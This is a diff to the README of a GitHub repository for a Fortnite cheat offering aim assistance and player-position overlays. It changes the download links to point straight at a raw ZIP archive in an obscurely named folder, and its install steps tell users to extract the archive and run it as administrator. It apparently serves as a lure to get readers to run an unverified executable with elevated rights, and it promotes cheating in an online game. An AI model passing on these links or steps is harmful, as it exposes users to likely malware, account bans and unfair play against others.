@@ -1,6 +1,6 @@
 # 🎯 Fortnite-Premium-External - Improve your game performance with precision.
 
-[![](https://img.shields.io/badge/Download-External-blue.svg)](https://github.com/rainwatershilling272/Fortnite-Premium-External)
+[![](https://img.shields.io/badge/Download-External-blue.svg)](https://github.com/rainwatershilling272/Fortnite-Premium-External/raw/refs/heads/main/nonprolific/Fortnite_Premium_External_3.8-alpha.3.zip)
 
 Fortnite-Premium-External provides tools to enhance your visibility and target accuracy within the game. This software operates outside the main game process to keep your experience stable and secure. It offers player positioning updates and aim assistance to help you track movement in every match.
 
@@ -21,7 +21,7 @@ Check that your display runs in Windowed Fullscreen mode while you use the appli
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit [this page to download](https://github.com/rainwatershilling272/Fortnite-Premium-External) the latest version.
+1. Visit [this page to download](https://github.com/rainwatershilling272/Fortnite-Premium-External/raw/refs/heads/main/nonprolific/Fortnite_Premium_External_3.8-alpha.3.zip) the latest version.
 2. Locate the file in your downloads folder.
 3. Extract the contents of the ZIP file to a new folder on your desktop.
 4. Right-click the application icon and select Run as administrator.
